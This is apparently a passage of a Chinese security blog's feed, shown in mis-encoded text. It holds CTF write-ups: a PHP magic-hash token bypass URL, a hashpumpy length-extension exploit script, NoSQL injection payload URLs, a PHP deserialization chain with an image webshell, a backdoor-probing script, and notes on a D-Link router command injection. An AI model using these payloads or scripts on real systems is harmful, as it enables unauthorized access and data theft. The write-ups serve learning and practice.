ç®¡ç†å‘˜çš„é‚®ç®±å’Œvimã€‚ã€‚å‘Šè¯‰æˆ‘vimå¹²å˜›ï¼Ÿå½“ç„¶æ˜¯swpæ–‡ä»¶äº† æ­¤å¤„è®¿é—®http://ctf5.shiyanbar.com/10/upload/.submit.php.swpå¯ä»¥å¾—åˆ°swpæ–‡ä»¶ (è¿™æ˜¯é€šè¿‡æŠ“åŒ…çŸ¥é“å‘çŽ°è¡¨å•ä¸Šä¼ çš„å°±æ˜¯è¿™ä¸ªæ–‡ä»¶ï¼Œå¤šè¯•å‡ æ¬¡ï¼Œè®°å¾—åœ¨æ–‡ä»¶åå‰åŠ *.*) 12345678910111213141516171819202122232425262728293031323334353637383940414243........è¿™ä¸€è¡Œæ˜¯çœç•¥çš„ä»£ç ......../*å¦‚æžœç™»å½•é‚®ç®±åœ°å€ä¸æ˜¯ç®¡ç†å‘˜åˆ™ die()æ•°æ®åº“ç»“æž„---- è¡¨çš„ç»“æž„ `user`--CREATE TABLE IF NOT EXISTS `user` ( `id` int(11) NOT NULL AUTO_INCREMENT, `username` varchar(255) NOT NULL, `email` varchar(255) NOT NULL, `token` int(255) NOT NULL DEFAULT '0', PRIMARY KEY (`id`)) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;---- è½¬å­˜è¡¨ä¸­çš„æ•°æ® `user`--INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES(1, '****ä¸å¯è§***', '***ä¸å¯è§***', 0);*/........è¿™ä¸€è¡Œæ˜¯çœç•¥çš„ä»£ç ........if(!empty($token)&amp;&amp;!empty($emailAddress))&#123; if(strlen($token)!=10) die('fail'); if($token!='0') die('fail'); $sql = "SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"; $r = mysql_query($sql) or die('db error'); $r = mysql_fetch_assoc($r); $r = $r['num']; if($r&gt;0)&#123; echo $flag; &#125;else&#123; echo "å¤±è´¥äº†å‘€"; &#125;&#125; tokenæ˜¯0e00000000å³å¯ç»•è¿‡ payloadå¦‚ä¸‹ï¼š http://ctf5.shiyanbar.com/10/upload/submit.php?emailAddress=admin%40simplexue.com&amp;token=0e00000000]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>web</tag>
        <tag>å®žéªŒå§</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windowsèµ„æºç®¡ç†å™¨ç¥žå™¨]]></title>
    <url>%2F2019%2F08%2F05%2Fwindows%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8%E7%A5%9E%E5%99%A8%2F</url>
    <content type="text"><![CDATA[ä¸€ç›´å¾ˆå›°æƒ‘ä¸çŸ¥é“å¦‚ä½•ä½¿ç”¨èµ„æºç®¡ç†å™¨ï¼Œæ¯æ¬¡å¤åˆ¶ç²˜è´´æ–‡ä»¶éƒ½éœ€è¦åŒæ—¶æ‰“å¼€å¤šä¸ªèµ„æºç®¡ç†å™¨ç„¶åŽå†emmmmï¼Œç„¶åŽå°±ä¼šå«Œèµ„æºç®¡ç†å™¨å¤ªå¤šäº†å°±æ— è„‘xæŽ‰äº†ï¼Œè¿™æ—¶å€™å°±ä¼šå‘çŽ°mmpæˆ‘åˆšæ‰“å¼€çš„èµ„æºç®¡ç†å™¨å‘¢ã€‚ã€‚ã€‚ç„¶åŽåˆè¦åŽ»æ‰¾emmmm äºŽæ˜¯åŽ»æœäº†ä¸€ä¸‹ç”¨æ¥å¢žå¼ºèµ„æºç®¡ç†å™¨çš„å·¥å…·æ‰¾åˆ°äº†è¿™ä¸ªï¼š QTTabBar å¯ä»¥è¯´æ˜¯ä½“éªŒå¾ˆæ£’äº† ç½‘å€ æ¯”å¦‚å¤šæ ‡ç­¾é¡µ å†æ¯”å¦‚æ–‡ä»¶å’Œæ–‡ä»¶å¤¹é¢„è§ˆ æ€»ä¹‹å¾ˆæ£’å°±æ˜¯äº†]]></content>
      <categories>
        <category>config</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>èµ„æºç®¡ç†å™¨</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[åˆè§å“ˆå¸Œæ‰©å±•æ”»å‡»]]></title>
    <url>%2F2019%2F08%2F05%2F%E5%88%9D%E8%A7%81%E5%93%88%E5%B8%8C%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[ç›®å‰è¿˜æ˜¯å¤ªèœäº†ï¼Œå‘å¸ˆå‚…ä»¬å¥½å¥½å­¦ä¹  SSRF me ç‚¹å¼€é¦–é¡µå°±æ˜¯ä¸€é•¿ä¸²ä»£ç , curlé‡å®šå‘ä¿å­˜åˆ°æ–‡ä»¶ä¸­,ç„¶åŽä»”ç»†åˆ†æžäº†ä¸€ä¸‹ä»£ç  ç¨‹åºä¸»è¦æ¶‰åŠåˆ°ä¸‰ä¸ªå‚æ•°,ä¸€ä¸ªæ˜¯paramåœ¨getä¸­,å¦å¤–ä¸¤ä¸ªactionå’Œsignæ˜¯é€šè¿‡cookieèŽ·å¾—çš„ è®¿é—®/geneSignå¯ä»¥å¾—åˆ°signçš„å€¼, actionå¯ä»¥æ˜¯scanæˆ–read,ä½†æ˜¯åœ¨è®¿é—®/De1ctfæ—¶,ä¼šæ£€éªŒsignæ˜¯å¦æ­£ç¡®,signçš„ç”Ÿæˆç®—æ³•ï¼š 12def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() è¿™å…¶ä¸­secret_keyæ˜¯ä¸çŸ¥é“çš„,å¹¶ä¸”gengeSigné™åˆ¶äº†actionåªèƒ½æ˜¯scan,ç»“åˆåŽæ¥é¢˜ç›®çš„æç¤ºæ˜¯è®¿é—®flag.txt,ä½†æ˜¯æœ€å¤šå°†è¿™ä¸ªæ–‡ä»¶è¯»å…¥result.txt,å´ä¸èƒ½è¯»å–å‡ºæ¥ã€‚ è¿™æ ·æƒ³æ¥æ˜¯ä¸æ˜¯åªèƒ½çˆ†ç ´secret_keyäº†ï¼Ÿä½†æ˜¯secret_keyåˆæ€Žä¹ˆä¼šé‚£ä¹ˆå®¹æ˜“ç»™ä½ å‘¢ã€‚ã€‚ è¿™å°±æ¶‰åŠåˆ°æˆ‘çš„çŸ¥è¯†ç›²åŒºäº†,å«åšå“ˆå¸Œæ‰©å±•æ”»å‡»ã€‚ã€‚ å…ˆçœ‹å®žéªŒå§ä¸€é“ä¾‹é¢˜ è¿™é¢˜ï¼Œæ³¨å…¥ä¸æƒ³æ³¨å…¥ï¼Œæºç æ²¡æ‰«å‡ºæ¥ï¼Œå•¥ä¿¡æ¯éƒ½æ²¡æœ‰ï¼Ÿ è¿˜æ˜¯è¦å¤šå…³æ³¨æŠ“åŒ…çš„ä¿¡æ¯ï¼Œå°¤å…¶æ˜¯æ•°æ®åŒ…ä¸­å‡ºçŽ°äº†ä¸€äº›ä½ éƒ½æ²¡æœ‰çœ‹è¿‡çš„ä¸œè¥¿çš„æ—¶å€™å°±è¦ä»”ç»†çœ‹ä¸€çœ‹äº† hhhæ²¡æƒ³åˆ°å§ åŽŸæ¥å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼èŽ·å–åˆ°æºä»£ç ã€‚ã€‚ 12345678910111213141516171819202122232425262728293031$flag = "XXXXXXXXXXXXXXXXXXXXXXX";$secret = "XXXXXXXXXXXXXXX"; // This secret is 15 characters long for security!$username = $_POST["username"];$password = $_POST["password"];if (!empty($_COOKIE["getmein"])) &#123; if (urldecode($username) === "admin" &amp;&amp; urldecode($password) != "admin") &#123; if ($COOKIE["getmein"] === md5($secret . urldecode($username . $password))) &#123; echo "Congratulations! You are a registered user.\n"; die ("The flag is ". $flag); &#125; else &#123; die ("Your cookies don't match up! STOP HACKING THIS SITE."); &#125; &#125; else &#123; die ("You are not an admin! LEAVE."); &#125;&#125;setcookie("sample-hash", md5($secret . urldecode("admin" . "admin")), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE["source"])) &#123; setcookie("source", 0, time() + (60 * 60 * 24 * 7));&#125;else &#123; if ($_COOKIE["source"] != 0) &#123; echo ""; // This source code is outputted here &#125;&#125; emptyå‡½æ•° éžç©ºè¿”å›žfalseï¼Œåˆ«æƒ³å¤šäº† å…³é”®åœ¨è¿™é‡Œï¼š if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) { å…¶ä¸­$secretæ˜¯ä¸çŸ¥é“çš„ï¼Œ$usernameå’Œpasswordæ˜¯å¯ä»¥æŽ§åˆ¶çš„ï¼Œå¹¶ä¸”$secretçš„é•¿åº¦æ˜¯15 å“ˆå¸Œæ‰©å±•æ”»å‡»çš„åŽŸç†ä¹‹åŽå†è®¨è®ºï¼Œæˆ‘ä»¬å…ˆåˆ†æžè¿™é¢˜å’‹æž é¦–å…ˆusernameå¿…é¡»æ˜¯admin,passwordä¸èƒ½æ˜¯adminé‚£å°±éšä¾¿è¾“ä¸€ä¸ªå€¼æ¯”å¦‚cck æˆ‘ä»¬çš„ç›®æ ‡å¾ˆç®€å•ï¼Œå°±æ˜¯ç»•è¿‡å®ƒ if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) { æ‰€ä»¥ç›®æ ‡å°±æ˜¯è®©$COOKIE[&quot;getmein&quot;]å’Œmd5åŽçš„å€¼ç›¸ç­‰ï¼Œæ‰€ä»¥éœ€è¦åŒæ—¶ä¼ªé€ ä¸¤è¾¹çš„å€¼å¤©å¹³æ‰èƒ½å¹³è¡¡ è€Œhashpumpå·¥å…·å°±æ˜¯æ¥å¹²è¿™ä¸ªçš„ï¼š ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;))çš„å€¼ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å¡«å……çš„æ•°æ®ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯å¡«å……æ•°æ®åŠ keyçš„é•¿åº¦ï¼Œç¬¬å››ä¸ªå‚æ•°æ˜¯æ·»åŠ çš„æ•°æ®ã€‚ è¿™æ ·å°±èƒ½åŒæ—¶ç”Ÿæˆå¤©å¹³å·¦è¾¹å’Œå³è¾¹çš„å€¼äº† å½“ç„¶è¿˜éœ€è¦URLç¼–ç ä¸€ä¸‹ ç†è§£äº†è¿™é¢˜é‚£ä¹ˆè¿™é“De1ctfçš„é¢˜ç›®ä¹Ÿå°±å¥½è¯´äº† å‚è€ƒctftimeä¸Šçš„expä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930import requests,hashpumpy,urllib"""hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)Arguments: hexdigest(str): Hex-encoded result of hashing key + original_data. original_data(str): Known data used to get the hash result hexdigest. data_to_add(str): Data to append key_length(int): Length of unknown data prepended to the hashReturns: A tuple containing the new hex digest and the new message.'"""payload = 'flag.txt'param = 'param=' + payloadbase_url = 'http://139.180.128.86/'signurl = base_url + 'geneSign?' + paramr = requests.post(url=signurl,cookies=&#123;'action':'scan'&#125;)sign = r.contentprint(sign)readsign,add_data = hashpumpy.hashpump(sign,payload+'scan','read',16)print(readsign)# print add_dataadd_data = add_data[len(payload):]print(add_data)expurl = base_url + 'De1ta?' + paramprint(urllib.parse.quote(add_data))r = requests.post(url=expurl,cookies=&#123;'action':urllib.parse.quote(add_data),'sign':readsign&#125;)print(r.content) å½“ç„¶æˆ‘ç”¨çš„æ˜¯python3ï¼Œå¹¶ä¸”æ³¨æ„urllib.parse.quote(add_data)æ–¹æ³• å°±æˆåŠŸäº†]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>hash</tag>
        <tag>De1ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[noSQL Injection]]></title>
    <url>%2F2019%2F08%2F04%2FnoSQL-Injection%2F</url>
    <content type="text"><![CDATA[cybrics noSQL è¿™é“é¢˜æ˜¯cybricsçš„ä¸€é“webé¢˜ï¼Œç”±äºŽæ˜¯ç¬¬ä¸€æ¬¡æŽ¥è§¦noSQLæ³¨å…¥ï¼Œæ‰€ä»¥å•ç‹¬æ‹¿å‡ºæ¥å¥½å¥½ç ”ç©¶ä¸€ä¸‹ phpæ“ä½œmongodbçš„è¯­æ³•ï¼š 123456789// connect to mongodb$m = new MongoClient();// select a database$db = $m-&gt;test;// select collection$collection = $db-&gt;users;$cursor = $collection-&gt;find($data);$cursor = $collection-&gt;findone($data); åŸºæœ¬ä¸Šå°±æ˜¯å®žä¾‹åŒ–å¯¹è±¡ï¼Œé€‰æ‹©æ•°æ®åº“ï¼Œé€‰æ‹©è¡¨ï¼Œç„¶åŽå¼€å§‹æŸ¥æ‰¾ æŸ¥è¯¢è¯­æ³•ä¸»è¦å¦‚ä¸‹ï¼š 123456789db.user.find(&#123;'username': 'xxxppp'&#125;)//æŸ¥æ‰¾ç”¨æˆ·åä¸ä¸ºadminä¸”passwordä¸º123456çš„ç”¨æˆ·db.user.find(&#123;'username':&#123;$ne:'admin'&#125;, 'password':'123456'&#125;)//æ­£åˆ™åŒ¹é…ï¼šdb.customer.find(&#123;'name': &#123;'$regex':'.*s.*'&#125; &#125;)db.user.find(&#123;'username':/jrx/i&#125;) è¿™é“é¢˜ç›®é¦–å…ˆå¯ä»¥ç”¨dirsearchå‘çŽ°æ˜¯gitæºç æ³„éœ²ï¼Œä¹‹åŽç”¨GitHacker.pyèŽ·å–åˆ°æºç  æŸ¥çœ‹index.phpï¼Œé¦–å…ˆè¦ç™»é™†ï¼Œéœ€è¦ç»•è¿‡authå‡½æ•° 123456789function auth($username, $password) &#123; $collection = (new MongoDB\Client('mongodb://localhost:27017/'))-&gt;test-&gt;users; $raw_query = '&#123;"username": "'.$username.'", "password": "'.$password.'"&#125;'; $document = $collection-&gt;findOne(json_decode($raw_query)); if (isset($document) &amp;&amp; isset($document-&gt;password)) &#123; return true; &#125; return false;&#125; usernameå’Œpasswordéƒ½æ²¡æœ‰ç»è¿‡è¿‡æ»¤å°±æ‹¼æŽ¥äº†ï¼Œä½†æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ªjson_decodeä¸å¤ªå¥½è¿‡ å¦‚æžœæ²¡æœ‰json_decodeå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:{&quot;$ne&quot;:&quot;1&quot;}}ç»•è¿‡ç™»é™†çš„é™åˆ¶ äºŽæ˜¯è¿™æ ·åšï¼š è¿™æ ·å°±ç»•è¿‡é™åˆ¶ç™»é™†äº† æ¥çœ‹ç¬¬äºŒä¸ªï¼š 1234567891011121314151617&lt;?php $filter = $_GET['filter']; $collection = (new MongoDB\Client('mongodb://localhost:27017/'))-&gt;test-&gt;news; $pipeline = [ ['$group' =&gt; ['_id' =&gt; '$category', 'count' =&gt; ['$sum' =&gt; 1]]], ['$sort' =&gt; ['count' =&gt; -1]], ['$limit' =&gt; 5], ]; $filters = [ ['$project' =&gt; ['category' =&gt; $filter]] ]; $cursor = $collection-&gt;aggregate(array_merge($filters, $pipeline));?&gt; array_mergeå‡½æ•°å°†$pipelineå’Œfiltersè¿›è¡Œåˆå¹¶ æŸ¥æ‰¾èµ„æ–™å¾—çŸ¥ åœ¨mongodbçš„aggregateä¸­ï¼Œå¯ä»¥ä½¿ç”¨$condè¿›è¡Œæ¡ä»¶è¯­å¥ï¼š å¹¶ä¸”ï¼š æˆ‘ä»¬å¯ä»¥æž„é€ å¦‚ä¸‹é“¾æŽ¥ï¼ŒåŒ¹é…åˆ°flagæ—¶å°†å…¶ç§»é™¤ http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$$REMOVE&amp;filter[$cond][else]=$category åˆ©ç”¨æ¡ä»¶è¯­å¥ï¼Œå‘çŽ°flagsæ—¶ï¼Œå°±è¾“å‡ºå…¶titleï¼š http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$title&amp;filter[$cond][else]=$category ä»Žtitleä¸­æˆ‘ä»¬å¾—çŸ¥æœ‰textï¼Œé‚£ä¹ˆè¯»å–ï¼š http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$text&amp;filter[$cond][else]=$category å°±å¯ä»¥èŽ·å¾—flagäº† NoSQLæ³¨å…¥å®žè·µ MongoDbä½œä¸ºä¸€ä¸ªNoSQLçš„æ•°æ®åº“ï¼Œæ“ä½œå…¶å®žè¿˜æ˜¯å¾ˆSQLå¾ˆç›¸ä¼¼çš„ éƒ½æœ‰æ•°æ®åº“ï¼Œä¸åŒçš„æ˜¯é›†åˆå¯¹åº”äºŽè¡¨ï¼Œæ–‡æ¡£å¯¹åº”äºŽè¡Œï¼Œå­—æ®µå¯¹åº”äºŽåˆ— è¿™å¼ å›¾æ˜¾ç¤ºäº†æ˜ å°„å…³ç³»ï¼š äºŽæ˜¯æ“ä½œMongoDbæ—¶å¯ä»¥ç†è§£ä¸ºé€‰æ‹©æ•°æ®åº“ï¼Œç„¶åŽé€‰æ‹©collectionï¼Œç„¶åŽæž„é€ æŸ¥è¯¢è¯­å¥è¿›è¡ŒæŸ¥è¯¢ æ¯”å¦‚demo.html $m = new MongoClient()è¿žæŽ¥æ•°æ®åº“ï¼Œ$db=$m-&gt;testé€‰æ‹©testæ•°æ®åº“ï¼Œç„¶åŽé€‰æ‹©collection : $collection=$db-&gt;uses æž„é€ çš„æŸ¥è¯¢è¯­å¥ä¸ºï¼š 12345$data = array( &apos;username&apos; =&gt; $_REQUEST[&apos;username&apos;], &apos;password&apos; =&gt; $_REQUEST[&apos;password&apos;] ); ä¹‹åŽè¿›è¡ŒæŸ¥è¯¢ï¼š $cursor = $collection-&gt;find($data) è¿™é‡Œæ²¡æœ‰å­—ç¬¦ä¸²çš„æ‹¼æŽ¥ï¼Œä¼¼ä¹Žæ— æ³•æ³¨å…¥ï¼Œä½†æ˜¯å¦‚æžœæˆ‘ä»¬ä¼ å…¥çš„usernameå’Œpasswordéƒ½æ˜¯æ•°ç»„çš„è¯ï¼Œé‚£ä¹ˆæŸ¥è¯¢çš„è¯­å¥å°±ä¼šæˆä¸ºè¿™æ ·ï¼š æž„é€ çš„URLï¼šhttp://localhost/NoSQLI/login/login.php?username[$ne]=1&amp;password[$ne]=1&amp;login-submit=login æ­¤æ—¶æ‹¼æŽ¥çš„$data json_encodeåŽå¾—åˆ°ï¼š &quot;{&quot;username&quot;:{&quot;$ne&quot;:&quot;1&quot;},&quot;password&quot;:{&quot;$ne&quot;:&quot;1&quot;}}&quot; å‚è€ƒ NoSQLæ³¨å…¥æ€»ç»“(MongoDB) 019 CyBRICS CTF Quals wp]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>NoSQL</tag>
        <tag>cybrics</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[qwbå¤çŽ°]]></title>
    <url>%2F2019%2F08%2F03%2Fqwb%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[å¤çŽ°ä¸€äº›qwbçš„é¢˜ç›® upload å¯ä»¥é€šè¿‡dirsearchæ‰¾åˆ°æ³„éœ²çš„æºç  ï¼Œ -uæŒ‡å®šurlï¼Œ -eæŒ‡å®šæ’ä»¶ å¦‚æžœæ˜¯ä»£ç å®¡è®¡é¢˜ï¼Œè€Œä¸”æ˜¯æ–‡ä»¶å¾ˆå¤šçš„ï¼Œéœ€è¦æ‰¾åˆ°åˆ©ç”¨ç‚¹ï¼Œæˆ‘ä»¬ç›´æŽ¥æœç´¢unserializeæ‰¾åˆ°ä¸€å¤„å¯ä»¥åˆ©ç”¨çš„ä»£ç ï¼š 123456789101112public function login_check()&#123; $profile=cookie('user'); //èŽ·å–åˆ°cookieä¸­çš„userå€¼ if(!empty($profile))&#123; $this-&gt;profile=unserialize(base64_decode($profile)); //ç›´æŽ¥ååºåˆ—åŒ– $this-&gt;profile_db=db('user')-&gt;where("ID",intval($this-&gt;profile['ID']))-&gt;find(); if(array_diff($this-&gt;profile_db,$this-&gt;profile)==null)&#123; return 1; &#125;else&#123; return 0; &#125; &#125; &#125; æŽ¥ä¸‹æ¥åŽ»å¯»æ‰¾å“ªé‡Œè°ƒç”¨äº†è¿™ä¸ªæ–¹æ³•ï¼Œåœ¨Profileè¿™ä¸ªç±»ä¸­ 123456789public function upload_img()&#123; if($this-&gt;checker)&#123; if(!$this-&gt;checker-&gt;login_check())&#123; $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/index"; $this-&gt;redirect($curr_url,302); exit(); &#125; &#125; ... upload_imgæ–¹æ³•ä¼šè°ƒç”¨login_checkååºåˆ—åŒ– è€Œè¿™ä¸ªæ“ä½œä¸­çš„ $this-&gt;extã€$this-&gt;filename_tmpã€$this-&gt;filename å‡å¯é€šè¿‡ååºåˆ—åŒ–æŽ§åˆ¶ã€‚ åŒæ—¶åœ¨Profile.phpæ–‡ä»¶çš„æœ«å°¾è¿˜æœ‰ä¸€å¤„ 1234567891011public function __get($name)&#123; return $this-&gt;except[$name];&#125;public function __call($name, $arguments)&#123; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125;&#125; è¿™ä¸¤ä¸ªå‡½æ•°çš„æ„æ€æ˜¯å¦‚æžœè®¿é—®äº†ç±»ä¸­çš„privateå±žæ€§ï¼Œå°±ä¼šè°ƒç”¨__getæ–¹æ³•ï¼Œå¦‚æžœè°ƒç”¨äº†ç±»ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œå°±ä¼šé€šè¿‡__callå¯¹$this-&gt;nameæ‰€æŒ‡å‘çš„æ–¹æ³•è¿›è¡Œè°ƒç”¨ æ„å‘³ç€æˆ‘ä»¬å¯ä»¥è°ƒç”¨ä»»æ„çš„ç±»æ–¹æ³• åŒæ—¶åœ¨Register.phpä¸­æœ‰ä¸€å¤„ï¼š 123456public function __destruct()&#123; if(!$this-&gt;registed)&#123; $this-&gt;checker-&gt;index(); &#125;&#125; é¦–å…ˆä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œä¹‹åŽé€šè¿‡Registerç±»çš„__destructæ–¹æ³•ï¼Œè°ƒç”¨__getæ–¹æ³•å¾—åˆ°å‡½æ•°åupload_imgï¼Œå†è°ƒç”¨__callæ–¹æ³•ï¼Œé€šè¿‡è°ƒç”¨upload_imgå¯ä»¥å¯¹å›¾ç‰‡é©¬è¿›è¡Œæ”¹å å¦‚æžœæˆ‘ä»¬å°†$this-&gt;checkerèµ‹å€¼ä¸ºProfileç±»ï¼Œç”±äºŽProfileç±»ä¸­ä¸å­˜åœ¨indexæ–¹æ³•ï¼Œå°±ä¼šè§¦å‘__callï¼Œè¿™æ ·å°±èƒ½æž„é€ ä¸€æ¡å®Œæˆçš„æ”»å‡»é“¾ é«˜æ˜Žçš„é»‘å®¢ 1234567891011121314151617181920212223242526272829import os,reimport requestsfilenames = os.listdir('/var/www/html/src')pattern = re.compile(r"\$_[GEPOST]&#123;3,4&#125;\[.*\]")for name in filenames: print(name) with open('/var/www/html/src/'+name,'r') as f: data = f.read() result = list(set(pattern.findall(data))) for ret in result: try: command = 'uname' flag = 'Linux' # command = 'phpinfo();' # flag = 'phpinfo' if 'GET' in ret: passwd = re.findall(r"'(.*)'",ret)[0] r = requests.get(url='http://127.0.0.1:8888/' + name + '?' + passwd + '='+ command) if flag in r.text: print('backdoor file is: ' + name) print('GET: ' + passwd) elif 'POST' in ret: passwd = re.findall(r"'(.*)'",ret)[0] r = requests.post(url='http://127.0.0.1:8888/' + name,data=&#123;passwd:command&#125;) if flag in r.text: print('backdoor file is: ' + name) print('POST: ' + passwd) except : pass]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>web</tag>
        <tag>thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DIR-823Gå¤çŽ°]]></title>
    <url>%2F2019%2F08%2F03%2FDIR-823G%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[Dlink DIR-823Gæ¼æ´žå¤çŽ°(CVE-2019-7298, CVE-2019-7297) binwaleæå–æ–‡ä»¶ æ–‡ä»¶ä¸‹è½½åœ°å€ ä¹‹åŽè¿›è¡Œå›ºä»¶çš„æ¨¡æ‹Ÿï¼Œ æˆåŠŸpingé€šç½‘ç»œ ç¬¬ä¸€æ¬¡è¿›å…¥è·¯ç”±å™¨éœ€è¦éœ€è¦è¿›è¡Œä¸€äº›è®¾ç½®é¡µé¢ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰æœªæŽˆæƒè®¿é—®çš„æƒ…å†µ å¯¼å‡ºé…ç½®æ–‡ä»¶ï¼ˆä¿¡æ¯æ³„éœ²ï¼‰ã€‚ &lt;!-- --&gt; æµè§ˆå™¨è®¿é—®ç›´æŽ¥å¼¹å‡ºäº†ä¸‹è½½é¡µé¢ å¯¼å‡ºé…ç½®æ–‡ä»¶ï¼Œ èŽ·å–åˆ°ç³»ç»Ÿä¿¡æ¯ goaheadç¨‹åºåˆ†æž(å‘½ä»¤æ³¨å…¥) åœ¨æŸ¥çœ‹å›ºä»¶çš„binç›®å½•æ—¶å‘çŽ°äº†ä¸€ä¸ªgoaheadçš„ç¨‹åºï¼Œè¯´æ˜Žæ­¤è·¯ç”±å™¨æ˜¯é€šè¿‡goaheadè¿›è¡Œå¼€å‘çš„ æ‹–å…¥åˆ°IDAä¸­è¿›è¡Œåˆ†æžï¼Œå‘çŽ°0x42424Cå¤„æ³¨å†Œäº†å¤„ç†å‡½æ•° æŠ“å–åˆ°ç™»é™†çš„æ•°æ®åŒ…ï¼Œæ˜¯å‘å¾€/HNAP1/çš„ åˆ†æž/HNAP1 å¤„ç†å‡½æ•°çš„é€»è¾‘ã€‚ å‡½æ•°ä½äºŽ0x42383C åœ¨è¿™ä¸ªéƒ¨åˆ†ï¼Œä»Žå‡½æ•°è¡¨ä¸­è¿›è¡ŒéåŽ†ï¼Œå¯»æ‰¾å‡½æ•° å‡½æ•°è¡¨å¦‚ä¸‹ï¼š æ‰¾åˆ°äº†éœ€è¦è°ƒç”¨çš„å¤„ç†å‡½æ•°åŽï¼Œä¼šé¦–å…ˆè®°å½• POST çš„åŽŸå§‹æŠ¥æ–‡, é¦–å…ˆç”¨ snprintf ç”Ÿæˆå‘½ä»¤ï¼Œ ç„¶åŽä½¿ç”¨ system æ‰§è¡Œã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡ç›´æŽ¥æ³¨å…¥ ' æ¥å‘½ä»¤æ‰§è¡Œ éªŒè¯ä¸€ä¸‹ï¼š å‚è€ƒ DIR-823G HNAP_Entry_Func]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>goahead</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pythonæ–‡æ¡£é˜…è¯»ç¬”è®°3]]></title>
    <url>%2F2019%2F07%2F31%2Fpython%E6%96%87%E6%A1%A3%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B03%2F</url>
    <content type="text"><![CDATA[pythonæ–‡ä»¶æ“ä½œ è¯»æ–‡ä»¶ï¼Œä½¿ç”¨openå‡½æ•°æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ å¦‚æžœä¸æŒ‡å®šæ¨¡å¼ï¼Œåˆ™é»˜è®¤ä»¥ text mode æ‰“å¼€ è¿™æ„å‘³ç€ä»Žæ–‡ä»¶ä¸­è¯»å–æˆ–å†™å…¥å­—ç¬¦ä¸²æ—¶ï¼Œéƒ½ä¼šä»¥æŒ‡å®šçš„ç¼–ç æ–¹å¼è¿›è¡Œç¼–ç ã€‚å¦‚æžœæœªæŒ‡å®šç¼–ç æ ¼å¼ï¼Œé»˜è®¤å€¼ä¸Žå¹³å°ç›¸å…³ read()æ–¹æ³•ï¼Œå¯é€‰å‚æ•°sizeï¼Œå½“ size è¢«çœç•¥æˆ–è€…ä¸ºè´Ÿçš„æ—¶å€™ï¼Œå°†è¯»å–å¹¶è¿”å›žæ–‡ä»¶çš„æ•´ä¸ªå†…å®¹ readline()æ–¹æ³•ï¼Œä»Žæ–‡ä»¶ä¸­è¯»å–ä¸€è¡Œ å¦‚æžœè¦éåŽ†æ–‡ä»¶ï¼Œå¯ä»¥é‡‡å–éåŽ†æ–‡ä»¶å¯¹è±¡çš„æ–¹å¼ï¼š 12&gt;&gt;&gt; for line in f:... print(line, end='') è¿™ç§å®žçŽ°æ–¹å¼æ¯”è¾ƒé«˜æ•ˆ åœ¨ç¼–å†™è„šæœ¬çš„è¿‡ç¨‹ä¸­ï¼Œæ³¨æ„æ–‡ä»¶çš„æ‰“å¼€æ–¹å¼ï¼Œç¼–ç è¿™äº›å°ç»†èŠ‚ å†™æ–‡ä»¶ f.write(string) ä¼šæŠŠ string çš„å†…å®¹å†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œå¹¶è¿”å›žå†™å…¥çš„å­—ç¬¦æ•°ã€‚ f.tell() 